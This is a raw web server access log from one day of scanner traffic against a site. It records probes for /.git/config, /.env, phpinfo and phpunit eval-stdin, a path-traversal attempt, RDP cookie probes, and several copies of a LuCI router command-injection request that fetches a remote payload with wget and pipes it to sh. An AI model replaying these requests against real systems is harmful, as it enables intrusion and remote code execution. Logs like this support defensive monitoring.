209.38.91.131 - - [13/Jan/2025:03:41:37 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.193.57.59 - - [13/Jan/2025:03:46:40 +0000] "GET / HTTP/1.1" 400 248 "-" "curl/7.29.0"
118.193.57.59 - - [13/Jan/2025:03:46:50 +0000] "GET / HTTP/1.1" 200 6771 "-" "curl/7.29.0"
118.193.57.59 - - [13/Jan/2025:03:46:53 +0000] "t3 12.1.2" 400 150 "-" "-"
165.154.162.212 - - [13/Jan/2025:03:47:54 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/577.35 (KHTML, like Gecko) Chrome/63.0.749 Safari/537.36"
165.154.162.212 - - [13/Jan/2025:03:47:55 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Go-http-client/1.1"
209.38.91.131 - - [13/Jan/2025:03:48:15 +0000] "GET /.git/config HTTP/1.1" 404 973242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
165.154.162.212 - - [13/Jan/2025:03:48:25 +0000] "GET /robots.txt HTTP/1.1" 404 737115 "-" "Go-http-client/1.1"
165.154.162.212 - - [13/Jan/2025:03:48:25 +0000] "GET /sitemap.xml HTTP/1.1" 404 720731 "-" "Go-http-client/1.1"
209.38.91.131 - - [13/Jan/2025:04:07:04 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:04:16:44 +0000] "GET /.git/config HTTP/1.1" 404 973242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:04:28:57 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:04:39:23 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
151.0.248.51 - - [13/Jan/2025:04:44:46 +0000] "GET / HTTP/1.0" 200 6758 "-" "-"
209.38.91.131 - - [13/Jan/2025:04:51:47 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:05:04:04 +0000] "GET /.git/config HTTP/1.1" 404 973235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:05:19:20 +0000] "GET /.git/config HTTP/1.1" 404 973242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.64.237 - - [13/Jan/2025:05:24:25 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
209.38.91.131 - - [13/Jan/2025:05:32:42 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.185.86 - - [13/Jan/2025:05:36:37 +0000] "GET /.env HTTP/1.1" 404 966477 "-" "Mozilla/5.0 Keydrop"
192.241.185.86 - - [13/Jan/2025:05:36:38 +0000] "GET /.env HTTP/1.1" 400 248 "-" "Mozilla/5.0 Keydrop"
162.158.172.54 - - [13/Jan/2025:05:39:53 +0000] "GET / HTTP/2.0" 200 6945 "http://cake.furosha.com/" "-"
209.38.91.131 - - [13/Jan/2025:05:46:20 +0000] "GET /.git/config HTTP/1.1" 404 973235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:05:51:46 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.81 - - [13/Jan/2025:05:57:44 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
209.38.91.131 - - [13/Jan/2025:06:05:00 +0000] "GET /.git/config HTTP/1.1" 404 973203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
4.255.99.105 - - [13/Jan/2025:06:11:10 +0000] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
209.38.91.131 - - [13/Jan/2025:06:15:19 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:06:20:40 +0000] "GET /.git/config HTTP/1.1" 404 973242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
5.181.190.248 - - [13/Jan/2025:06:36:28 +0000] "GET / HTTP/1.1" 200 6771 "-" "-"
209.38.91.131 - - [13/Jan/2025:06:50:26 +0000] "GET /.git/config HTTP/1.1" 404 973203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
147.185.133.237 - - [13/Jan/2025:06:54:18 +0000] "GET / HTTP/1.1" 200 6771 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.242.226.109 - - [13/Jan/2025:06:55:57 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:07:02:09 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.7.214.81 - - [13/Jan/2025:07:05:36 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
35.205.163.236 - - [13/Jan/2025:07:09:39 +0000] "GET / HTTP/1.1" 200 6771 "-" "python-requests/2.32.3"
172.71.98.142 - - [13/Jan/2025:07:16:49 +0000] "GET / HTTP/2.0" 200 6945 "http://cake.furosha.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
92.255.57.58 - - [13/Jan/2025:07:17:24 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:07:23:52 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:07:38:45 +0000] "GET /.git/config HTTP/1.1" 404 973231 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
13.64.108.135 - - [13/Jan/2025:07:41:04 +0000] "GET /actuator/health HTTP/1.1" 404 524118 "-" "Mozilla/5.0 zgrab/0.x"
162.158.114.174 - - [13/Jan/2025:07:47:56 +0000] "GET / HTTP/2.0" 200 6945 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
209.38.91.131 - - [13/Jan/2025:07:52:55 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
147.45.112.6 - - [13/Jan/2025:07:58:34 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
103.153.77.181 - - [13/Jan/2025:08:01:18 +0000] "GET /.env HTTP/1.1" 404 974068 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
103.153.77.181 - - [13/Jan/2025:08:01:22 +0000] "POST / HTTP/1.1" 403 676538 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
172.68.211.153 - - [13/Jan/2025:08:01:28 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/2.0" 404 146 "-" "python-requests/2.25.1"
209.38.91.131 - - [13/Jan/2025:08:02:46 +0000] "GET /.git/config HTTP/1.1" 404 973235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:08:22:14 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:08:33:23 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.156.128.129 - - [13/Jan/2025:08:33:56 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
35.230.45.164 - - [13/Jan/2025:08:40:46 +0000] "OPTIONS / HTTP/1.0" 405 150 "-" "-"
45.156.130.6 - - [13/Jan/2025:08:41:01 +0000] "GET / HTTP/1.1" 200 6777 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:08:54:22 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:09:00:42 +0000] "GET /.git/config HTTP/1.1" 404 973196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.255.57.58 - - [13/Jan/2025:09:09:23 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 923102 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.214.55.186 - - [13/Jan/2025:09:13:01 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:09:14:31 +0000] "GET /.git/config HTTP/1.1" 404 973185 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.71.94.139 - - [13/Jan/2025:09:18:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 1101656 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
209.38.91.131 - - [13/Jan/2025:09:24:37 +0000] "GET /.git/config HTTP/1.1" 404 973206 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.216.20.74 - - [13/Jan/2025:09:33:25 +0000] "POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php HTTP/1.1" 400 650 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
154.216.20.74 - - [13/Jan/2025:09:33:29 +0000] "GET /public/index.php/home/file/user_pics HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:09:37:30 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:09:49:51 +0000] "GET /.git/config HTTP/1.1" 404 973242 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:09:56:11 +0000] "GET /.git/config HTTP/1.1" 404 973235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.128.52.63 - - [13/Jan/2025:10:03:05 +0000] "GET / HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
178.128.52.63 - - [13/Jan/2025:10:03:06 +0000] "GET / HTTP/1.1" 200 6955 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
178.128.52.63 - - [13/Jan/2025:10:03:07 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Go-http-client/1.1"
172.71.148.70 - - [13/Jan/2025:10:03:08 +0000] "GET /favicon.ico HTTP/2.0" 304 0 "http://cake.furosha.com/favicon.ico" "Go-http-client/1.1"
209.38.226.9 - - [13/Jan/2025:10:08:00 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:10:10:36 +0000] "GET /.git/config HTTP/1.1" 404 973235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.71.103.161 - - [13/Jan/2025:10:18:59 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 1101675 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
209.38.91.131 - - [13/Jan/2025:10:36:44 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.158.102.204 - - [13/Jan/2025:10:47:52 +0000] "GET / HTTP/2.0" 200 6945 "http://cake.furosha.com/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.181.190.248 - - [13/Jan/2025:10:56:22 +0000] "GET / HTTP/1.1" 200 6771 "-" "-"
209.38.91.131 - - [13/Jan/2025:11:00:05 +0000] "GET /.git/config HTTP/1.1" 404 973216 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:11:03:39 +0000] "GET /.git/config HTTP/1.1" 404 973235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:11:16:37 +0000] "GET /.git/config HTTP/1.1" 404 973211 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:11:33:25 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:11:37:49 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:11:47:19 +0000] "GET /.git/config HTTP/1.1" 404 973241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.189.76.30 - - [13/Jan/2025:11:51:00 +0000] "GET /version HTTP/1.1" 404 540502 "-" "Mozilla/5.0 zgrab/0.x"
209.38.91.131 - - [13/Jan/2025:11:51:17 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:12:06:45 +0000] "GET /.git/config HTTP/1.1" 404 973203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.38.91.131 - - [13/Jan/2025:12:18:48 +0000] "GET /.git/config HTTP/1.1" 404 973234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.215.236.132 - - [13/Jan/2025:12:20:43 +0000] "GET /.git/config HTTP/1.1" 404 973656 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.145 Safari/537.36 Vivaldi/2.6.1566.49"
209.38.91.131 - - [13/Jan/2025:12:41:36 +0000] "GET /.git/config HTTP/1.1" 404 973203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.189.191 - - [13/Jan/2025:12:47:07 +0000] "GET /.env HTTP/1.1" 404 966495 "-" "Mozilla/5.0 Keydrop"
192.241.189.191 - - [13/Jan/2025:12:47:07 +0000] "GET /.env HTTP/1.1" 400 248 "-" "Mozilla/5.0 Keydrop"
167.94.146.48 - - [13/Jan/2025:12:52:39 +0000] "GET / HTTP/1.1" 200 6771 "-" "-"
167.94.146.48 - - [13/Jan/2025:12:52:42 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.48 - - [13/Jan/2025:12:52:42 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
68.183.15.116 - - [13/Jan/2025:13:06:04 +0000] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
92.255.57.11 - - [13/Jan/2025:13:08:48 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
172.71.103.164 - - [13/Jan/2025:13:13:52 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 1101675 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
172.69.221.21 - - [13/Jan/2025:13:26:30 +0000] "GET / HTTP/2.0" 200 6945 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
172.69.221.96 - - [13/Jan/2025:13:26:31 +0000] "GET /favicon.ico HTTP/2.0" 200 15086 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
18.118.135.178 - - [13/Jan/2025:13:44:23 +0000] "GET / HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
18.118.135.178 - - [13/Jan/2025:13:44:34 +0000] "GET / HTTP/1.1" 200 6777 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
95.214.55.186 - - [13/Jan/2025:13:57:49 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
172.71.183.162 - - [13/Jan/2025:14:18:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 1101675 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
87.120.115.34 - - [13/Jan/2025:14:20:50 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 972803 "-" "Mozilla/5.0 (Knoppix; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
172.70.110.27 - - [13/Jan/2025:14:20:58 +0000] "GET / HTTP/2.0" 200 6945 "-" "Mozilla/5.0 (compatible)"
162.158.62.80 - - [13/Jan/2025:14:20:59 +0000] "GET /favicon.ico HTTP/2.0" 200 15086 "https://cake.furosha.com/" "Mozilla/5.0 (compatible)"
172.71.95.56 - - [13/Jan/2025:15:23:28 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 1101637 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
20.236.249.81 - - [13/Jan/2025:15:24:02 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 939356 "-" "Mozilla/5.0 zgrab/0.x"
141.94.145.70 - - [13/Jan/2025:15:51:28 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 973555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
5.181.190.248 - - [13/Jan/2025:15:53:54 +0000] "GET / HTTP/1.1" 200 6771 "-" "-"
141.94.145.70 - - [13/Jan/2025:16:02:02 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 973331 "-" "Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
172.71.98.216 - - [13/Jan/2025:16:42:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 1101656 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
92.255.85.106 - - [13/Jan/2025:16:53:08 +0000] "GET /remote/login?lang=en HTTP/1.1" 400 150 "-" "-"
92.255.85.106 - - [13/Jan/2025:16:53:09 +0000] "GET /remote/login?lang=en HTTP/1.1" 400 150 "-" "-"
162.158.102.204 - - [13/Jan/2025:17:23:38 +0000] "GET / HTTP/2.0" 200 6945 "http://cake.furosha.com/" "-"
162.142.125.34 - - [13/Jan/2025:17:32:21 +0000] "GET / HTTP/1.1" 200 6771 "-" "-"
162.142.125.34 - - [13/Jan/2025:17:32:32 +0000] "GET / HTTP/1.1" 200 6777 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.34 - - [13/Jan/2025:17:32:36 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
62.84.100.218 - - [13/Jan/2025:17:39:59 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
172.70.47.122 - - [13/Jan/2025:17:59:10 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 1101656 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
172.71.183.64 - - [13/Jan/2025:18:11:33 +0000] "GET / HTTP/2.0" 200 6945 "http://cake.furosha.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
162.158.86.206 - - [13/Jan/2025:18:42:53 +0000] "GET / HTTP/2.0" 200 6945 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
172.71.148.70 - - [13/Jan/2025:18:42:53 +0000] "GET /favicon.ico HTTP/2.0" 304 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.158.102.119 - - [13/Jan/2025:19:36:28 +0000] "GET / HTTP/2.0" 200 6945 "http://cake.furosha.com/" "-"
